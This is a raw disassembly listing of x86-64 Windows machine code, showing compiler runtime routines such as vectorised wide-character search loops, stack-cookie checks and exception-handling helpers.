   140003406:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   14000340d:	0f 29 70 d8          	movaps %xmm6,-0x28(%rax)
   140003411:	0f 29 78 c8          	movaps %xmm7,-0x38(%rax)
   140003415:	48 8d 68 88          	lea    -0x78(%rax),%rbp
   140003419:	48 83 e5 e0          	and    $0xffffffffffffffe0,%rbp
   14000341d:	48 8b da             	mov    %rdx,%rbx
   140003420:	48 8b f9             	mov    %rcx,%rdi
   140003423:	49 8b d1             	mov    %r9,%rdx
   140003426:	49 8b c8             	mov    %r8,%rcx
   140003429:	e8 02 03 00 00       	call   0x140003730
   14000342e:	c5 fe 6f d0          	vmovdqu %ymm0,%ymm2
   140003432:	c5 fe 7f 45 20       	vmovdqu %ymm0,0x20(%rbp)
   140003437:	48 83 fb 08          	cmp    $0x8,%rbx
   14000343b:	72 51                	jb     0x14000348e
   14000343d:	c5 fe 6f 35 9b 05 01 	vmovdqu 0x1059b(%rip),%ymm6        # 0x1400139e0
   140003444:	00 
   140003445:	c5 fe 6f 3d 73 05 01 	vmovdqu 0x10573(%rip),%ymm7        # 0x1400139c0
   14000344c:	00 
   14000344d:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   140003451:	c4 e2 7d 33 64 5f f0 	vpmovzxwd -0x10(%rdi,%rbx,2),%ymm4
   140003458:	48 83 eb 08          	sub    $0x8,%rbx
   14000345c:	c5 dd db c6          	vpand  %ymm6,%ymm4,%ymm0
   140003460:	c5 f5 72 d4 05       	vpsrld $0x5,%ymm4,%ymm1
   140003465:	c5 fd 76 dd          	vpcmpeqd %ymm5,%ymm0,%ymm3
   140003469:	c4 e2 75 36 d2       	vpermd %ymm2,%ymm1,%ymm2
   14000346e:	c5 dd df c7          	vpandn %ymm7,%ymm4,%ymm0
   140003472:	c4 e2 6d 47 d0       	vpsllvd %ymm0,%ymm2,%ymm2
   140003477:	c5 ed db cb          	vpand  %ymm3,%ymm2,%ymm1
   14000347b:	c5 fc 50 c1          	vmovmskps %ymm1,%eax
   14000347f:	85 c0                	test   %eax,%eax
   140003481:	75 7b                	jne    0x1400034fe
   140003483:	c5 fe 6f 55 20       	vmovdqu 0x20(%rbp),%ymm2
   140003488:	48 83 fb 08          	cmp    $0x8,%rbx
   14000348c:	73 c3                	jae    0x140003451
   14000348e:	83 e3 07             	and    $0x7,%ebx
   140003491:	74 7d                	je     0x140003510
   140003493:	4c 8d 04 1b          	lea    (%rbx,%rbx,1),%r8
   140003497:	48 8b d7             	mov    %rdi,%rdx
   14000349a:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000349e:	c5 f8 77             	vzeroupper
   1400034a1:	e8 ba c6 00 00       	call   0x14000fb60
   1400034a6:	c4 e2 7d 33 6d 00    	vpmovzxwd 0x0(%rbp),%ymm5
   1400034ac:	c5 fe 6f 05 2c 05 01 	vmovdqu 0x1052c(%rip),%ymm0        # 0x1400139e0
   1400034b3:	00 
   1400034b4:	c5 fd db cd          	vpand  %ymm5,%ymm0,%ymm1
   1400034b8:	c5 d5 df 05 00 05 01 	vpandn 0x10500(%rip),%ymm5,%ymm0        # 0x1400139c0
   1400034bf:	00 
   1400034c0:	c5 e9 ef d2          	vpxor  %xmm2,%xmm2,%xmm2
   1400034c4:	c5 f5 76 e2          	vpcmpeqd %ymm2,%ymm1,%ymm4
   1400034c8:	c5 ed 72 d5 05       	vpsrld $0x5,%ymm5,%ymm2
   1400034cd:	c4 e2 6d 36 5d 20    	vpermd 0x20(%rbp),%ymm2,%ymm3
   1400034d3:	c4 e2 65 47 c8       	vpsllvd %ymm0,%ymm3,%ymm1
   1400034d8:	8b cb                	mov    %ebx,%ecx
   1400034da:	b8 01 00 00 00       	mov    $0x1,%eax
   1400034df:	d3 e0                	shl    %cl,%eax
   1400034e1:	c5 f5 db d4          	vpand  %ymm4,%ymm1,%ymm2
   1400034e5:	c5 fc 50 d2          	vmovmskps %ymm2,%edx
   1400034e9:	ff c8                	dec    %eax
   1400034eb:	23 d0                	and    %eax,%edx
   1400034ed:	74 21                	je     0x140003510
   1400034ef:	f3 0f bd c2          	lzcnt  %edx,%eax
   1400034f3:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400034f8:	2b c8                	sub    %eax,%ecx
   1400034fa:	8b c1                	mov    %ecx,%eax
   1400034fc:	eb 19                	jmp    0x140003517
   1400034fe:	c5 f8 77             	vzeroupper
   140003501:	f3 0f bd c8          	lzcnt  %eax,%ecx
   140003505:	8b c9                	mov    %ecx,%ecx
   140003507:	48 2b d9             	sub    %rcx,%rbx
   14000350a:	48 8d 43 1f          	lea    0x1f(%rbx),%rax
   14000350e:	eb 0a                	jmp    0x14000351a
   140003510:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003517:	c5 f8 77             	vzeroupper
   14000351a:	0f 28 b4 24 90 00 00 	movaps 0x90(%rsp),%xmm6
   140003521:	00 
   140003522:	0f 28 bc 24 80 00 00 	movaps 0x80(%rsp),%xmm7
   140003529:	00 
   14000352a:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140003531:	5f                   	pop    %rdi
   140003532:	5b                   	pop    %rbx
   140003533:	5d                   	pop    %rbp
   140003534:	c3                   	ret
   140003535:	cc                   	int3
   140003536:	cc                   	int3
   140003537:	cc                   	int3
   140003538:	cc                   	int3
   140003539:	cc                   	int3
   14000353a:	cc                   	int3
   14000353b:	cc                   	int3
   14000353c:	cc                   	int3
   14000353d:	cc                   	int3
   14000353e:	cc                   	int3
   14000353f:	cc                   	int3
   140003540:	40 53                	rex push %rbx
   140003542:	55                   	push   %rbp
   140003543:	56                   	push   %rsi
   140003544:	57                   	push   %rdi
   140003545:	41 56                	push   %r14
   140003547:	41 57                	push   %r15
   140003549:	48 83 ec 58          	sub    $0x58,%rsp
   14000354d:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
   140003552:	48 8b 05 a7 aa 01 00 	mov    0x1aaa7(%rip),%rax        # 0x14001e000
   140003559:	48 33 c4             	xor    %rsp,%rax
   14000355c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003561:	48 8b ea             	mov    %rdx,%rbp
   140003564:	48 8b d9             	mov    %rcx,%rbx
   140003567:	48 83 e5 f0          	and    $0xfffffffffffffff0,%rbp
   14000356b:	4d 8b f1             	mov    %r9,%r14
   14000356e:	48 03 e9             	add    %rcx,%rbp
   140003571:	49 8b f8             	mov    %r8,%rdi
   140003574:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003579:	4c 8b fa             	mov    %rdx,%r15
   14000357c:	49 8b f1             	mov    %r9,%rsi
   14000357f:	49 83 f9 10          	cmp    $0x10,%r9
   140003583:	77 7d                	ja     0x140003602
   140003585:	4d 8b c1             	mov    %r9,%r8
   140003588:	48 d1 ee             	shr    $1,%rsi
   14000358b:	48 8b d7             	mov    %rdi,%rdx
   14000358e:	e8 cd c5 00 00       	call   0x14000fb60
   140003593:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   140003599:	48 3b dd             	cmp    %rbp,%rbx
   14000359c:	74 1e                	je     0x1400035bc
   14000359e:	66 90                	xchg   %ax,%ax
   1400035a0:	f3 0f 6f 03          	movdqu (%rbx),%xmm0
   1400035a4:	8b c6                	mov    %esi,%eax
   1400035a6:	ba 08 00 00 00       	mov    $0x8,%edx
   1400035ab:	66 0f 3a 61 f0 01    	pcmpestri $0x1,%xmm0,%xmm6
   1400035b1:	72 43                	jb     0x1400035f6
   1400035b3:	48 83 c3 10          	add    $0x10,%rbx
   1400035b7:	48 3b dd             	cmp    %rbp,%rbx
   1400035ba:	75 e4                	jne    0x1400035a0
   1400035bc:	41 83 e7 0f          	and    $0xf,%r15d
   1400035c0:	0f 84 3d 01 00 00    	je     0x140003703
   1400035c6:	41 8b ff             	mov    %r15d,%edi
   1400035c9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400035ce:	45 8b c7             	mov    %r15d,%r8d
   1400035d1:	48 d1 ef             	shr    $1,%rdi
   1400035d4:	48 8b d3             	mov    %rbx,%rdx
   1400035d7:	e8 84 c5 00 00       	call   0x14000fb60
   1400035dc:	66 0f 6f 44 24 20    	movdqa 0x20(%rsp),%xmm0
   1400035e2:	8b c6                	mov    %esi,%eax
   1400035e4:	8b d7                	mov    %edi,%edx
   1400035e6:	66 0f 3a 61 f0 01    	pcmpestri $0x1,%xmm0,%xmm6
   1400035ec:	72 08                	jb     0x1400035f6
   1400035ee:	49 03 df             	add    %r15,%rbx
   1400035f1:	e9 0d 01 00 00       	jmp    0x140003703
   1400035f6:	48 63 c1             	movslq %ecx,%rax
   1400035f9:	48 8d 04 43          	lea    (%rbx,%rax,2),%rax
   1400035fd:	e9 04 01 00 00       	jmp    0x140003706
   140003602:	48 83 e6 f0          	and    $0xfffffffffffffff0,%rsi
   140003606:	41 83 e6 0f          	and    $0xf,%r14d
   14000360a:	48 03 f7             	add    %rdi,%rsi
   14000360d:	45 8b c6             	mov    %r14d,%r8d
   140003610:	48 8b d6             	mov    %rsi,%rdx
   140003613:	e8 48 c5 00 00       	call   0x14000fb60
   140003618:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000361e:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140003624:	49 d1 ee             	shr    $1,%r14
   140003627:	48 3b dd             	cmp    %rbp,%rbx
   14000362a:	74 67                	je     0x140003693
   14000362c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003630:	f3 0f 6f 0b          	movdqu (%rbx),%xmm1
   140003634:	4c 8b c7             	mov    %rdi,%r8
   140003637:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000363e:	00 00 
   140003640:	f3 41 0f 6f 00       	movdqu (%r8),%xmm0
   140003645:	b8 08 00 00 00       	mov    $0x8,%eax
   14000364a:	8b d0                	mov    %eax,%edx
   14000364c:	66 0f 3a 61 c1 01    	pcmpestri $0x1,%xmm1,%xmm0
   140003652:	73 07                	jae    0x14000365b
   140003654:	41 3b c9             	cmp    %r9d,%ecx
   140003657:	44 0f 4c c9          	cmovl  %ecx,%r9d
   14000365b:	49 83 c0 10          	add    $0x10,%r8
   14000365f:	4c 3b c6             	cmp    %rsi,%r8
   140003662:	75 dc                	jne    0x140003640
   140003664:	45 85 f6             	test   %r14d,%r14d
   140003667:	74 17                	je     0x140003680
   140003669:	41 8b c6             	mov    %r14d,%eax
   14000366c:	ba 08 00 00 00       	mov    $0x8,%edx
   140003671:	66 0f 3a 61 f1 01    	pcmpestri $0x1,%xmm1,%xmm6
   140003677:	73 07                	jae    0x140003680
   140003679:	41 3b c9             	cmp    %r9d,%ecx
   14000367c:	44 0f 4c c9          	cmovl  %ecx,%r9d
   140003680:	41 83 f9 10          	cmp    $0x10,%r9d
   140003684:	0f 85 9b 00 00 00    	jne    0x140003725
   14000368a:	48 83 c3 10          	add    $0x10,%rbx
   14000368e:	48 3b dd             	cmp    %rbp,%rbx
   140003691:	75 9d                	jne    0x140003630
   140003693:	41 83 e7 0f          	and    $0xf,%r15d
   140003697:	74 6a                	je     0x140003703
   140003699:	41 8b ef             	mov    %r15d,%ebp
   14000369c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400036a1:	48 d1 ed             	shr    $1,%rbp
   1400036a4:	45 8b c7             	mov    %r15d,%r8d
   1400036a7:	48 8b d3             	mov    %rbx,%rdx
   1400036aa:	e8 b1 c4 00 00       	call   0x14000fb60
   1400036af:	66 0f 6f 4c 24 20    	movdqa 0x20(%rsp),%xmm1
   1400036b5:	44 8b c5             	mov    %ebp,%r8d
   1400036b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400036bf:	00 
   1400036c0:	f3 0f 6f 07          	movdqu (%rdi),%xmm0
   1400036c4:	b8 08 00 00 00       	mov    $0x8,%eax
   1400036c9:	8b d5                	mov    %ebp,%edx
   1400036cb:	66 0f 3a 61 c1 01    	pcmpestri $0x1,%xmm1,%xmm0
   1400036d1:	73 07                	jae    0x1400036da
   1400036d3:	41 3b c8             	cmp    %r8d,%ecx
   1400036d6:	44 0f 4c c1          	cmovl  %ecx,%r8d
   1400036da:	48 83 c7 10          	add    $0x10,%rdi
   1400036de:	48 3b fe             	cmp    %rsi,%rdi
   1400036e1:	75 dd                	jne    0x1400036c0
   1400036e3:	45 85 f6             	test   %r14d,%r14d
   1400036e6:	74 14                	je     0x1400036fc
   1400036e8:	41 8b c6             	mov    %r14d,%eax
   1400036eb:	8b d5                	mov    %ebp,%edx
   1400036ed:	66 0f 3a 61 f1 01    	pcmpestri $0x1,%xmm1,%xmm6
   1400036f3:	73 07                	jae    0x1400036fc
   1400036f5:	41 3b c8             	cmp    %r8d,%ecx
   1400036f8:	44 0f 4c c1          	cmovl  %ecx,%r8d
   1400036fc:	49 63 c0             	movslq %r8d,%rax
   1400036ff:	48 8d 1c 43          	lea    (%rbx,%rax,2),%rbx
   140003703:	48 8b c3             	mov    %rbx,%rax
   140003706:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000370b:	48 33 cc             	xor    %rsp,%rcx
   14000370e:	e8 6d 03 00 00       	call   0x140003a80
   140003713:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
   140003718:	48 83 c4 58          	add    $0x58,%rsp
   14000371c:	41 5f                	pop    %r15
   14000371e:	41 5e                	pop    %r14
   140003720:	5f                   	pop    %rdi
   140003721:	5e                   	pop    %rsi
   140003722:	5d                   	pop    %rbp
   140003723:	5b                   	pop    %rbx
   140003724:	c3                   	ret
   140003725:	49 63 c1             	movslq %r9d,%rax
   140003728:	48 8d 04 43          	lea    (%rbx,%rax,2),%rax
   14000372c:	eb d8                	jmp    0x140003706
   14000372e:	cc                   	int3
   14000372f:	cc                   	int3
   140003730:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003735:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000373a:	55                   	push   %rbp
   14000373b:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140003742:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140003747:	48 83 e5 e0          	and    $0xffffffffffffffe0,%rbp
   14000374b:	48 8b 05 ae a8 01 00 	mov    0x1a8ae(%rip),%rax        # 0x14001e000
   140003752:	48 33 c4             	xor    %rsp,%rax
   140003755:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   14000375c:	48 8d 3c 51          	lea    (%rcx,%rdx,2),%rdi
   140003760:	48 8b d9             	mov    %rcx,%rbx
   140003763:	48 83 fa 14          	cmp    $0x14,%rdx
   140003767:	77 4f                	ja     0x1400037b8
   140003769:	c5 f9 ef c0          	vpxor  %xmm0,%xmm0,%xmm0
   14000376d:	48 3b cf             	cmp    %rdi,%rcx
   140003770:	0f 84 f2 00 00 00    	je     0x140003868
   140003776:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000377d:	00 00 00 
   140003780:	0f b7 13             	movzwl (%rbx),%edx
   140003783:	b8 01 00 00 00       	mov    $0x1,%eax
   140003788:	8b ca                	mov    %edx,%ecx
   14000378a:	48 83 c3 02          	add    $0x2,%rbx
   14000378e:	c1 e9 03             	shr    $0x3,%ecx
   140003791:	83 e2 3f             	and    $0x3f,%edx
   140003794:	83 e1 18             	and    $0x18,%ecx
   140003797:	d3 e0                	shl    %cl,%eax
   140003799:	c5 f9 6e c8          	vmovd  %eax,%xmm1
   14000379d:	c4 e2 7d 32 d1       	vpmovzxbq %xmm1,%ymm2
   1400037a2:	c5 f9 6e ca          	vmovd  %edx,%xmm1
   1400037a6:	c5 ed f3 d1          	vpsllq %xmm1,%ymm2,%ymm2
   1400037aa:	c5 ed eb c0          	vpor   %ymm0,%ymm2,%ymm0
   1400037ae:	48 3b df             	cmp    %rdi,%rbx
   1400037b1:	75 cd                	jne    0x140003780
   1400037b3:	e9 b0 00 00 00       	jmp    0x140003868
   1400037b8:	33 d2                	xor    %edx,%edx
   1400037ba:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400037be:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1400037c4:	e8 37 ca 00 00       	call   0x140010200
   1400037c9:	48 3b df             	cmp    %rdi,%rbx
   1400037cc:	74 13                	je     0x1400037e1
   1400037ce:	66 90                	xchg   %ax,%ax
   1400037d0:	0f b7 03             	movzwl (%rbx),%eax
   1400037d3:	48 83 c3 02          	add    $0x2,%rbx
   1400037d7:	c6 44 05 00 ff       	movb   $0xff,0x0(%rbp,%rax,1)
   1400037dc:	48 3b df             	cmp    %rdi,%rbx
   1400037df:	75 ef                	jne    0x1400037d0
   1400037e1:	c5 fe 6f 8d c0 00 00 	vmovdqu 0xc0(%rbp),%ymm1
   1400037e8:	00 
   1400037e9:	c5 fe 6f 85 e0 00 00 	vmovdqu 0xe0(%rbp),%ymm0
   1400037f0:	00 
   1400037f1:	c5 fd d7 d8          	vpmovmskb %ymm0,%ebx
   1400037f5:	c5 fe 6f 85 a0 00 00 	vmovdqu 0xa0(%rbp),%ymm0
   1400037fc:	00 
   1400037fd:	c5 7d d7 d0          	vpmovmskb %ymm0,%r10d
   140003801:	c5 fe 6f 45 60       	vmovdqu 0x60(%rbp),%ymm0
   140003806:	c5 7d d7 c0          	vpmovmskb %ymm0,%r8d
   14000380a:	c5 fe 6f 45 20       	vmovdqu 0x20(%rbp),%ymm0
   14000380f:	c5 fd d7 c8          	vpmovmskb %ymm0,%ecx
   140003813:	c5 7d d7 d9          	vpmovmskb %ymm1,%r11d
   140003817:	c5 fe 6f 8d 80 00 00 	vmovdqu 0x80(%rbp),%ymm1
   14000381e:	00 
   14000381f:	c5 7d d7 c9          	vpmovmskb %ymm1,%r9d
   140003823:	c5 fe 6f 4d 40       	vmovdqu 0x40(%rbp),%ymm1
   140003828:	c5 fd d7 d1          	vpmovmskb %ymm1,%edx
   14000382c:	c5 fe 6f 4d 00       	vmovdqu 0x0(%rbp),%ymm1
   140003831:	c4 c1 79 6e c1       	vmovd  %r9d,%xmm0
   140003836:	c4 c3 79 22 c2 01    	vpinsrd $0x1,%r10d,%xmm0,%xmm0
   14000383c:	c4 c3 79 22 c3 02    	vpinsrd $0x2,%r11d,%xmm0,%xmm0
   140003842:	c5 fd d7 c1          	vpmovmskb %ymm1,%eax
   140003846:	c5 f9 6e d0          	vmovd  %eax,%xmm2
   14000384a:	c4 e3 69 22 d1 01    	vpinsrd $0x1,%ecx,%xmm2,%xmm2
   140003850:	c4 e3 69 22 d2 02    	vpinsrd $0x2,%edx,%xmm2,%xmm2
   140003856:	c4 c3 69 22 d0 03    	vpinsrd $0x3,%r8d,%xmm2,%xmm2
   14000385c:	c4 e3 79 22 c3 03    	vpinsrd $0x3,%ebx,%xmm0,%xmm0
   140003862:	c4 e3 6d 18 c0 01    	vinsertf128 $0x1,%xmm0,%ymm2,%ymm0
   140003868:	48 8b 8d 00 01 00 00 	mov    0x100(%rbp),%rcx
   14000386f:	48 33 cc             	xor    %rsp,%rcx
   140003872:	e8 09 02 00 00       	call   0x140003a80
   140003877:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   14000387e:	00 
   14000387f:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140003883:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140003887:	49 8b e3             	mov    %r11,%rsp
   14000388a:	5d                   	pop    %rbp
   14000388b:	c3                   	ret
   14000388c:	cc                   	int3
   14000388d:	cc                   	int3
   14000388e:	cc                   	int3
   14000388f:	cc                   	int3
   140003890:	40 53                	rex push %rbx
   140003892:	55                   	push   %rbp
   140003893:	56                   	push   %rsi
   140003894:	57                   	push   %rdi
   140003895:	48 81 ec 38 01 00 00 	sub    $0x138,%rsp
   14000389c:	48 8b 05 5d a7 01 00 	mov    0x1a75d(%rip),%rax        # 0x14001e000
   1400038a3:	48 33 c4             	xor    %rsp,%rax
   1400038a6:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   1400038ad:	00 
   1400038ae:	f6 05 9f a7 01 00 04 	testb  $0x4,0x1a79f(%rip)        # 0x14001e054
   1400038b5:	49 8b e9             	mov    %r9,%rbp
   1400038b8:	49 8b f0             	mov    %r8,%rsi
   1400038bb:	48 8b da             	mov    %rdx,%rbx
   1400038be:	48 8b f9             	mov    %rcx,%rdi
   1400038c1:	74 07                	je     0x1400038ca
   1400038c3:	e8 08 f6 ff ff       	call   0x140002ed0
   1400038c8:	eb 72                	jmp    0x14000393c
   1400038ca:	4c 89 b4 24 30 01 00 	mov    %r14,0x130(%rsp)
   1400038d1:	00 
   1400038d2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400038d7:	41 be 00 01 00 00    	mov    $0x100,%r14d
   1400038dd:	33 d2                	xor    %edx,%edx
   1400038df:	45 8b c6             	mov    %r14d,%r8d
   1400038e2:	e8 19 c9 00 00       	call   0x140010200
   1400038e7:	4c 8d 04 6e          	lea    (%rsi,%rbp,2),%r8
   1400038eb:	48 8b ce             	mov    %rsi,%rcx
   1400038ee:	49 3b f0             	cmp    %r8,%rsi
   1400038f1:	74 17                	je     0x14000390a
   1400038f3:	0f b7 01             	movzwl (%rcx),%eax
   1400038f6:	66 41 3b c6          	cmp    %r14w,%ax
   1400038fa:	73 5c                	jae    0x140003958
   1400038fc:	48 83 c1 02          	add    $0x2,%rcx
   140003900:	c6 44 04 20 01       	movb   $0x1,0x20(%rsp,%rax,1)
   140003905:	49 3b c8             	cmp    %r8,%rcx
   140003908:	75 e9                	jne    0x1400038f3
   14000390a:	33 c9                	xor    %ecx,%ecx
   14000390c:	48 85 db             	test   %rbx,%rbx
   14000390f:	74 19                	je     0x14000392a
   140003911:	0f b7 04 4f          	movzwl (%rdi,%rcx,2),%eax
   140003915:	66 41 3b c6          	cmp    %r14w,%ax
   140003919:	73 07                	jae    0x140003922
   14000391b:	80 7c 04 20 00       	cmpb   $0x0,0x20(%rsp,%rax,1)
   140003920:	75 0f                	jne    0x140003931
   140003922:	48 ff c1             	inc    %rcx
   140003925:	48 3b cb             	cmp    %rbx,%rcx
   140003928:	75 e7                	jne    0x140003911
   14000392a:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003931:	4c 8b b4 24 30 01 00 	mov    0x130(%rsp),%r14
   140003938:	00 
   140003939:	48 8b c1             	mov    %rcx,%rax
   14000393c:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   140003943:	00 
   140003944:	48 33 cc             	xor    %rsp,%rcx
   140003947:	e8 34 01 00 00       	call   0x140003a80
   14000394c:	48 81 c4 38 01 00 00 	add    $0x138,%rsp
   140003953:	5f                   	pop    %rdi
   140003954:	5e                   	pop    %rsi
   140003955:	5d                   	pop    %rbp
   140003956:	5b                   	pop    %rbx
   140003957:	c3                   	ret
   140003958:	4c 8d 0c 5f          	lea    (%rdi,%rbx,2),%r9
   14000395c:	48 8b d7             	mov    %rdi,%rdx
   14000395f:	49 3b f9             	cmp    %r9,%rdi
   140003962:	74 23                	je     0x140003987
   140003964:	0f b7 0a             	movzwl (%rdx),%ecx
   140003967:	48 8b c6             	mov    %rsi,%rax
   14000396a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003970:	66 3b 08             	cmp    (%rax),%cx
   140003973:	74 12                	je     0x140003987
   140003975:	48 83 c0 02          	add    $0x2,%rax
   140003979:	49 3b c0             	cmp    %r8,%rax
   14000397c:	75 f2                	jne    0x140003970
   14000397e:	48 83 c2 02          	add    $0x2,%rdx
   140003982:	49 3b d1             	cmp    %r9,%rdx
   140003985:	eb db                	jmp    0x140003962
   140003987:	48 8b c2             	mov    %rdx,%rax
   14000398a:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003991:	48 2b c7             	sub    %rdi,%rax
   140003994:	48 d1 e8             	shr    $1,%rax
   140003997:	49 3b d1             	cmp    %r9,%rdx
   14000399a:	48 0f 45 c8          	cmovne %rax,%rcx
   14000399e:	eb 91                	jmp    0x140003931
   1400039a0:	e9 4b f3 ff ff       	jmp    0x140002cf0
   1400039a5:	cc                   	int3
   1400039a6:	cc                   	int3
   1400039a7:	cc                   	int3
   1400039a8:	40 53                	rex push %rbx
   1400039aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400039ae:	48 8b d9             	mov    %rcx,%rbx
   1400039b1:	eb 0f                	jmp    0x1400039c2
   1400039b3:	48 8b cb             	mov    %rbx,%rcx
   1400039b6:	e8 95 3a 00 00       	call   0x140007450
   1400039bb:	85 c0                	test   %eax,%eax
   1400039bd:	74 13                	je     0x1400039d2
   1400039bf:	48 8b cb             	mov    %rbx,%rcx
   1400039c2:	e8 89 3b 00 00       	call   0x140007550
   1400039c7:	48 85 c0             	test   %rax,%rax
   1400039ca:	74 e7                	je     0x1400039b3
   1400039cc:	48 83 c4 20          	add    $0x20,%rsp
   1400039d0:	5b                   	pop    %rbx
   1400039d1:	c3                   	ret
   1400039d2:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   1400039d6:	74 06                	je     0x1400039de
   1400039d8:	e8 f3 05 00 00       	call   0x140003fd0
   1400039dd:	cc                   	int3
   1400039de:	e8 8d db ff ff       	call   0x140001570
   1400039e3:	cc                   	int3
   1400039e4:	e9 07 06 00 00       	jmp    0x140003ff0
   1400039e9:	cc                   	int3
   1400039ea:	cc                   	int3
   1400039eb:	cc                   	int3
   1400039ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400039f0:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1400039f4:	48 8b ca             	mov    %rdx,%rcx
   1400039f7:	49 8b d1             	mov    %r9,%rdx
   1400039fa:	e8 0d 00 00 00       	call   0x140003a0c
   1400039ff:	b8 01 00 00 00       	mov    $0x1,%eax
   140003a04:	48 83 c4 28          	add    $0x28,%rsp
   140003a08:	c3                   	ret
   140003a09:	cc                   	int3
   140003a0a:	cc                   	int3
   140003a0b:	cc                   	int3
   140003a0c:	40 53                	rex push %rbx
   140003a0e:	45 8b 18             	mov    (%r8),%r11d
   140003a11:	48 8b da             	mov    %rdx,%rbx
   140003a14:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140003a18:	4c 8b c9             	mov    %rcx,%r9
   140003a1b:	41 f6 00 04          	testb  $0x4,(%r8)
   140003a1f:	4c 8b d1             	mov    %rcx,%r10
   140003a22:	74 13                	je     0x140003a37
   140003a24:	41 8b 40 08          	mov    0x8(%r8),%eax
   140003a28:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140003a2c:	f7 d8                	neg    %eax
   140003a2e:	4c 03 d1             	add    %rcx,%r10
   140003a31:	48 63 c8             	movslq %eax,%rcx
   140003a34:	4c 23 d1             	and    %rcx,%r10
   140003a37:	49 63 c3             	movslq %r11d,%rax
   140003a3a:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140003a3e:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140003a42:	8b 48 08             	mov    0x8(%rax),%ecx
   140003a45:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003a49:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140003a4e:	74 10                	je     0x140003a60
   140003a50:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140003a55:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   140003a5a:	48 23 c1             	and    %rcx,%rax
   140003a5d:	4c 03 c8             	add    %rax,%r9
   140003a60:	4c 33 ca             	xor    %rdx,%r9
   140003a63:	49 8b c9             	mov    %r9,%rcx
   140003a66:	5b                   	pop    %rbx
   140003a67:	e9 14 00 00 00       	jmp    0x140003a80
   140003a6c:	cc                   	int3
   140003a6d:	cc                   	int3
   140003a6e:	cc                   	int3
   140003a6f:	cc                   	int3
   140003a70:	cc                   	int3
   140003a71:	cc                   	int3
   140003a72:	cc                   	int3
   140003a73:	cc                   	int3
   140003a74:	cc                   	int3
   140003a75:	cc                   	int3
   140003a76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003a7d:	00 00 00 
   140003a80:	48 3b 0d 79 a5 01 00 	cmp    0x1a579(%rip),%rcx        # 0x14001e000
   140003a87:	75 10                	jne    0x140003a99
   140003a89:	48 c1 c1 10          	rol    $0x10,%rcx
   140003a8d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140003a92:	75 01                	jne    0x140003a95
   140003a94:	c3                   	ret
   140003a95:	48 c1 c9 10          	ror    $0x10,%rcx
   140003a99:	e9 8e 05 00 00       	jmp    0x14000402c
   140003a9e:	cc                   	int3
   140003a9f:	cc                   	int3
   140003aa0:	40 53                	rex push %rbx
   140003aa2:	48 83 ec 20          	sub    $0x20,%rsp
   140003aa6:	48 8d 05 5b ff 00 00 	lea    0xff5b(%rip),%rax        # 0x140013a08
   140003aad:	48 8b d9             	mov    %rcx,%rbx
   140003ab0:	48 89 01             	mov    %rax,(%rcx)
   140003ab3:	f6 c2 01             	test   $0x1,%dl
   140003ab6:	74 0a                	je     0x140003ac2
   140003ab8:	ba 18 00 00 00       	mov    $0x18,%edx
   140003abd:	e8 22 ff ff ff       	call   0x1400039e4
   140003ac2:	48 8b c3             	mov    %rbx,%rax
   140003ac5:	48 83 c4 20          	add    $0x20,%rsp
   140003ac9:	5b                   	pop    %rbx
   140003aca:	c3                   	ret
   140003acb:	cc                   	int3
   140003acc:	40 53                	rex push %rbx
   140003ace:	48 83 ec 20          	sub    $0x20,%rsp
   140003ad2:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003ad7:	e8 f0 3b 00 00       	call   0x1400076cc
   140003adc:	e8 8f 09 00 00       	call   0x140004470
